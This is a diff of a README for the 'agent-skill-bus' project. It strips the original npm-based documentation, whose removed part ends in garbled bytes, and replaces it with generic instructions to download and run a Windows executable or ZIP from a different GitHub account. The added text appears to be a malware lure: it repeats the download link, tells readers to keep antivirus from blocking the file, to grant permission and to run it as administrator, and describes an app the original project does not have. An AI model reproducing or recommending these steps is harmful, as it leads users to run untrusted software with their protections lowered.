@@ -1,190 +1,191 @@
-# 🚌 Agent Skill Bus
+# 🚌 agent-skill-bus - Keep agent skills healthy
 
-**The missing runtime for [Agent Skills](https://agentskills.io) — health monitoring, self-improvement, and dependency management for any AI agent framework.**
+[![Download](https://img.shields.io/badge/Download-Agent%20Skill%20Bus-blue.svg)](https://github.com/ocular-buffercountry141/agent-skill-bus)
 
-Your agent skills silently break. Agent Skill Bus detects it, diagnoses the root cause, and fixes it automatically.
+## 🚀 Getting Started
 
-Built by [合同会社みやび (LLC Miyabi)](https://miyabi-ai.jp) — Running 42 AI agents in production daily.
+Agent Skill Bus is a Windows app for keeping AI agent skills in good shape. It watches skill health, helps manage skill dependencies, and supports self-checks for agents that use tools and tasks.
 
-[![npm version](https://img.shields.io/npm/v/agent-skill-bus.svg)](https://www.npmjs.com/package/agent-skill-bus)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js CI](https://github.com/ShunsukeHayashi/agent-skill-bus/actions/workflows/ci.yml/badge.svg)](https://github.com/ShunsukeHayashi/agent-skill-bus/actions/workflows/ci.yml)
-[![Zero Dependencies](https://img.shields.io/badge/dependencies-0-brightgreen.svg)](https://www.npmjs.com/package/agent-skill-bus)
-[![GitHub Discussions](https://img.shields.io/github/discussions/ShunsukeHayashi/agent-skill-bus)](https://github.com/ShunsukeHayashi/agent-skill-bus/discussions)
+Use it if you want a simple way to run a skill bus on your PC and keep agent workflows organized.
 
-> **Looking for the full ecosystem?** This repo is the core runtime. For **110+ production-ready skills**, marketplace, and the complete Miyabi Agent Society platform, visit **[agentskills.bath.me](https://agentskills.bath.me)**.
+## 📥 Download
 
----
+Visit this page to download:
 
-## What is this?
+https://github.com/ocular-buffercountry141/agent-skill-bus
 
-Agent Skill Bus is a **framework-agnostic runtime for AI agent skill health** — orchestrating, monitoring, and self-improving agent skills across any framework. Think of it as the operational backbone that keeps your agent skills healthy over weeks and months, not just during a single run. It consists of three integrated modules:
+On that page, look for the latest Windows file or release package. Download it to your computer, then open it to start setup.
 
-| Module | Purpose | Standalone? |
-|--------|---------|-------------|
-| **Prompt Request Bus** | DAG-based task queue with dependency resolution & file locking | ✅ Yes |
-| **Self-Improving Skills** | Automatic skill quality monitoring & repair loop | ✅ Yes |
-| **Knowledge Watcher** | External change detection → automatic improvement triggers | ✅ Yes |
+## 🖥️ What You Need
 
-They work independently, but together they form a **closed-loop self-improving agent system**:
+Use a Windows PC with:
 
-```
-External Changes ──→ Knowledge Watcher ──→ Prompt Request Bus ──→ Execute
-                                                ↑                    │
-                                                │                    ↓
-                                          Self-Improving ←── Skill Runs Log
-                                             Skills
-```
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A stable internet connection for the first download
+- Permission to run downloaded apps
 
-## Why?
+If you plan to use it with larger agent setups, 8 GB of RAM gives you more room.
 
-Most agent frameworks handle **execution** (LangGraph, CrewAI, AutoGen). None handle **operational health**:
+## 🧩 What It Does
 
-- 🔴 **Skills silently degrade** — An API changes, a model updates, auth expires. Nobody notices until it fails in production.
-- 🔴 **Tasks collide** — Two agents edit the same file simultaneously. Data corruption.
-- 🔴 **No dependency management** — Complex tasks need A→B→C ordering. Most systems just run everything in parallel.
-- 🔴 **No learning loop** — Failures repeat because there's no feedback mechanism.
+Agent Skill Bus helps you manage agent skills in one place. It can:
 
-Agent Skill Bus solves all four.
+- Track skill health
+- Watch for missing or broken dependencies
+- Help agents check their own skill quality
+- Support task routing across skills
+- Record events in JSONL format
+- Work across different agent frameworks
+- Fit into setups that use Claude Code, Codex, CrewAI, LangGraph, and similar tools
 
-## Quick Start
+It is built for users who want a clean runtime layer for skill handling without extra setup.
 
-```bash
-# One command to set up everything
-npx agent-skill-bus init
+## 🪟 Install on Windows
 
-# Log a skill execution
-npx agent-skill-bus record-run --agent my-agent --skill api-caller --task "fetch data" --result success --score 1.0
+1. Open the download page:
+   https://github.com/ocular-buffercountry141/agent-skill-bus
+2. Find the newest Windows release or download file.
+3. Download the file to your Downloads folder.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file or installer file.
+7. If Windows asks for permission, choose Yes.
+8. Follow the setup steps on screen.
 
-# Check what needs attention
-npx agent-skill-bus flagged
+If the app opens in a browser window or a small desktop window, that is normal for this kind of tool.
 
-# Queue a task
-npx agent-skill-bus enqueue --source human --priority high --agent dev --task "Fix auth bug"
+## ▶️ Run the App
 
-# See what's ready to dispatch
-npx agent-skill-bus dispatch
+After setup, start the app from:
 
-# See which data files this project is actually using
-npx agent-skill-bus daths
-```
+- Your desktop shortcut
+- The Start menu
+- The folder where you extracted it
 
-### For Claude Code / Codex users
+When the app runs, it may show a dashboard or status view. That view can show skill health, dependency status, and task flow.
 
-Add this to your `AGENTS.md`:
-```
-After completing any task, log the result:
-npx agent-skill-bus record-run --agent claude --skill <skill-name> --task "<task>" --result <success|fail|partial> --score <0.0-1.0>
-```
+## 🔧 First-Time Setup
 
-That's it. The self-improving loop runs automatically.
+When you open Agent Skill Bus for the first time, check these items:
 
-## Dashboard
+- Confirm the app can read and write files in its folder
+- Make sure your antivirus does not block it
+- Keep the app in a folder you can find again
+- If it asks for a data path, choose a simple folder like Documents or Desktop
+- If it asks for a runtime file, keep the default choice
 
-Get a real-time overview of all your agent skills with a single command:
+For best results, run it from a folder with a short path name. This helps avoid file path issues on Windows.
 
-```bash
-npx agent-skill-bus dashboard
-```
+## 📂 Main Folder Layout
 
-```
-╔══════════════════════════════════════════════════════════╗
-║              🚌 Agent Skill Bus Dashboard               ║
-╚═══════════════════════════════════════════════════════╝
+A typical setup may include these parts:
 
-📊 Queue: 3 queued │ 1 running │ 12 completed │ 0 failed
+- `config` for settings
+- `data` for logs and records
+- `skills` for skill files
+- `monitoring` for health checks
+- `bus` for task flow rules
+- `logs` for JSONL event output
 
- Status   Skill               Score  Trend  Health
-────────────────────────────────────────────────────────
- ● ALERT  api-caller           0.42   ↓     ██░░░░░░░░░░
- ● OK     code-review          0.95   ↑     ███████████░
- ● OK     deploy-pipeline      0.88   ─     ██████████░░
+You may not need to touch these folders. They help the app keep track of what each skill does.
 
-⚠ Flagged Skills:
-  api-caller — score_drop: dropped from 0.91 to 0.42 (drift: -53.8%)
-```
+## 🧠 How It Helps You
 
-Options: `--days N` (default: 7), `--no-color` for CI/piping.
+Agent Skill Bus can make skill-based agent systems easier to manage by:
 
-## Modules
+- Showing which skills are working
+- Finding missing parts before a task starts
+- Keeping records of agent activity
+- Helping you group related skills
+- Making it easier to swap one agent framework for another
 
-### 📬 Prompt Request Bus
+This is useful if you run many tasks and want fewer broken steps.
 
-A JSONL-based task queue with:
+## 🛠️ Common Use Cases
 
-- **DAG dependency resolution** — Tasks specify `dependsOn` other tasks. Automatic topological execution.
-- **File-level locking** — Prevent two agents from editing the same file. TTL-based deadlock prevention.
-- **Priority routing** — `critical > high > medium > low`. Critical tasks bypass the queue.
-- **Multi-source ingestion** — Human commands, cron jobs, GitHub webhooks, internal triggers all use the same format.
-- **Deduplication** — Same task won't be queued twice.
+Use Agent Skill Bus for:
 
-```json
-{
-  "id": "pr-001",
-  "ts": "2026-03-18T08:00:00Z",
-  "source": "human",
-  "priority": "high",
-  "agent": "dev-agent",
-  "task": "Fix authentication bug in auth.ts",
-  "status": "queued",
-  "dependsOn": [],
-  "affectedFiles": ["myapp:src/auth.ts"],
-  "dagId": null
-}
-```
+- Checking if agent skills are ready
+- Watching for skill errors
+- Managing tool chains for agents
+- Logging task runs for later review
+- Keeping dependency checks in one place
+- Running the same skill set across different agent systems
 
-[Full documentation →](skills/prompt-request-bus/SKILL.md)
+It works well for people who want structure without needing to build it by hand.
 
-### 🔄 Self-Improving Skills
+## 📘 Basic Workflow
 
-A 7-step quality loop inspired by [Cognee's self-improving agents](https://www.cognee.ai):
+1. Download the app from the link above.
+2. Install or open it on Windows.
+3. Start the app.
+4. Add or point it to your skill folders.
+5. Let it scan skills and dependencies.
+6. Review the health status.
+7. Fix any missing files or broken links it shows.
+8. Run your agent tasks with the bus active.
 
-```
-OBSERVE → ANALYZE → DIAGNOSE → PROPOSE → EVALUATE → APPLY → RECORD
-```
+## 🧰 Troubleshooting
 
-- **Automatic failure detection** — Score drops, trend analysis, consecutive failure alerts.
-- **LLM-powered diagnosis** — Reads the failing skill + error logs, identifies root cause.
-- **Safe auto-repair** — Low-risk fixes applied automatically. High-risk changes need human approval.
-- **Drift detection** — Catches silent degradation (score drops >15% week-over-week).
+If the app does not start:
 
-[Full documentation →](skills/self-improving-skills/SKILL.md)
+- Try opening it as an administrator
+- Check that Windows did not block the file
+- Make sure the download finished fully
+- Re-extract the ZIP file if it came in a compressed folder
 
-### 👁️ Knowledge Watcher
+If you see missing file messages:
 
-Monitors external changes and triggers improvement requests:
+- Confirm the skill folder still exists
+- Check file names for changes
+- Make sure linked tools are installed
+- Rebuild the setup with the default paths
 
-- **Tier 1 (every check):** Dependency versions, API changes, config drift
-- **Tier 2 (daily):** Community patterns, user feedback, platform changes
-- **Tier 3 (weekly):** Industry trends, competitor releases, best practice updates
+If the app closes right away:
 
-When a change is detected:
-1. Assess impact on existing skills
-2. Generate a Prompt Request with severity rating
-3. Route to Self-Improving Skills or human reviewer
+- Restart your PC
+- Try a fresh download
+- Remove any old copy before installing again
 
-[Full documentation →](skills/knowledge-watcher/SKILL.md)
+## 🔒 Data and Logs
 
-## Documentation
+Agent Skill Bus may create local logs on your computer. These logs help track:
 
-| Guide | Description |
-|-------|-------------|
-| [Architecture Deep Dive](docs/architecture.md) | System design, JSONL data layer, DAG scheduling, file locking |
-| [Self-Improving Skills](docs/self-improving-skills.md) | The 7-step quality loop, drift detection, auto-repair |
-| [Knowledge Watcher](docs/knowledge-watcher.md) | Three-tier monitoring, change detection, impact assessment |
-| [Integration Guide](docs/integration-guide.md) | Claude Code, Codex, LangGraph, CrewAI, CI/CD setup |
-| [Framework Comparison](docs/comparison.md) | Feature matrix vs. LangGraph, CrewAI, AutoGen, Mastra, VoltAgent |
+- Skill health checks
+- Dependency status
+- Task events
+- Error records
+- Runtime changes
 
-## Architecture
+If you use it in a shared folder, make sure the folder stays private.
 
-```
-┌─────────────────────────────────────────────────────┐
-│                  Agent Skill Bus                     │
-│                                                     │
-│  ┌──────────────┐  ┌──────────────┐  ┌───────────┐ │
-│  │   Knowledge   │  │    Prompt    │  │   Self-   │ │
-│  │   Watcher     │──│   Request    │──│ Improving │ │
-│  │   (detect)    │  │   Bus (route)│  │  (repair) │ │
-│  └──────────────┘  └──────────────┘  └───────────┘ │
-│         │                  │                │       │
-                                               : 0���q�^
+## 🧪 Suggested Settings
+
+For a smooth first run, use:
+
+- Default install path
+- A local folder for data
+- Simple skill names
+- Short folder names
+- One agent framework at a time while testing
+
+After you confirm it works, you can connect more skills and more tools.
+
+## 🧭 Helpful Tips
+
+- Keep your skill files in one place
+- Do not rename folders after setup
+- Update the app from the same repository page
+- Save copies of your skill config files
+- Check logs when a task fails
+- Start with a small test set before using all skills
+
+## 📎 Download Again
+
+Visit this page to download:
+
+https://github.com/ocular-buffercountry141/agent-skill-bus
+
+Use the newest Windows file from the repository page and open it on your PC after download
